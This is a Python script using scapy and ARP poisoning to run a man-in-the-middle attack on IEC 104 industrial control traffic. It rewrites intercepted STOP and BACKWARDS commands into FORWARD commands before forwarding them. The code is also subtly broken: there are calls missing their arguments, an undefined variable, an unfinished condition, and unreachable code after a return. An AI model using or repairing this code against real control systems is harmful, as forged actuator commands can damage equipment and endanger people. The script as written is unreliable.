#!/usr/bin/python3

"""
    Use scapy to modify packets going through your machine.
    Based on nfqueue to block packets in the kernel and pass them to scapy for validation
"""

from iec104lib import *
from iec104lib import *
from EchoIEC104Server import *



ip_router = ARP_poisoning.get_iprouter()
ip_target= ARP_poisoning.get_ipdest()
mac_router=ARP_poisoning.get_mac(ip_router)
mac_target=ARP_poisoning.get_mac(ip_target)

interface = "eno1"

## Def vars for our needed paquets

LENGTH_APCI=6
ASDU_TYPE_BYTE=1
ASDU_ACT_ORDER_VALUE_BYTE=9 
ASDU_ACT_ORDER_VALUE_LENGTH=2 

ASDU_TYPE_ACT_CHAR="\x31"
ASDU_ACT_ORDER_STOP_VALUE_STR="\x00\x00"
ASDU_ACT_ORDER_BACKWARDS_VALUE_STR="\x07\x00"
ASDU_ACT_ORDER_FORWARD_VALUE_STR="\xe7\x00"

	

def modify_stop_packet(chosen_packet):
	#get a list of bytes from the payload
	copied_packet_payload_list=list(str(chosen_packet[TCP].payload))
	print("\t before : "+"".join(copied_packet_payload_list).encode("hex"))
	#modify the 2bytes to the FORWARD value
	copied_packet_payload_list[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]=ASDU_ACT_ORDER_FORWARD_VALUE_STR
	new_payload="".join(copied_packet_payload_list)
	#put the changed payload in the original packet
	chosen_packet[TCP].payload=Raw(new_payload)
	print("\t after  : "+new_payload.encode("hex"))
	#TODO : change the mac_dst address!
	
	#delete the checksum so that scapy will handle them and recalculate them
	del chosen_packet[IP].chksum 
	del chosen_packet[TCP].chksum
	#print(chosen_packet.show2())

def is_packet_containing_apci(packet):
	if packet.haslayer(u_frame) or packet.haslayer(s_frame) or packet.haslayer(i_frame) :
		return True
	else :
		return False

def is_104_packet_from_router(packet):
	if is_packet_containing_apci()  and (packet[IP].src==ip_router):
		return True
	else:
		return False

def is_104_packet_from_raspberry(packet):
	if is_packet_containing_apci() and (packet[IP].src ==ip_target):
		return True
	else:
		return False


def is_STOP_order_packet(chosen_packet):
	if( not is_104_packet_from_raspberry(chosen_packet)):
		return False
	# payload_packet=str(chosen_packet[TCP].payload)
	# asdu_type=payload_packet[LENGTH_APCI:LENGTH_APCI+ASDU_TYPE_BYTE]
	if(asdu_type == ASDU_TYPE_ACT_CHAR):
		asdu_order_value=payload_packet[LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE:LENGTH_APCI+ASDU_ACT_ORDER_VALUE_BYTE+ASDU_ACT_ORDER_VALUE_LENGTH]
		if(asdu_order_value == ASDU_ACT_ORDER_STOP_VALUE_STR or asdu_order_value ==ASDU_ACT_ORDER_BACKWARDS_VALUE_STR):
			return True
			modify_stop_packet(chosen_packet)

	return False


def callback_sniff(packet):
	#packet[Ether].src == MAC_CONTROLLER and
	if(packet[Ether].src == mac_router and packet[IP].src==ip_router and packet[IP].dst==ip_target):

		if is_packet_containing_apci() and is_:
			modify_stop_packet(packet)
#	else:
#		print("not TCP")
#		print(packet.summary())
		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)



	if(packet[Ether].src == mac_target and packet[IP].src==ip_target and packet[IP].dst==ip_router):
		#print("p->c")		
#	else:
#		print("not TCP")
#		print(packet.summary())
		send(packet[IP],verbose=False)#,iface=MY_INTERFACE)#,verbose=False)

def loop_sleep():
	while 1:
		try:
			time.sleep(1.5)
		except KeyboardInterrupt:
			break

def main_sniff():

	print("MitM with sniffing & IEC 104 packet modification until ctrl-c")
	sniff(prn=callback_sniff,filter="ip")

	start_ip_forward()
	print("MitM with full forward until ctrl-c")
	loop_sleep()
	print("")
	stop_ip_forward()

if __name__ == "__main__":
    main_sniff()
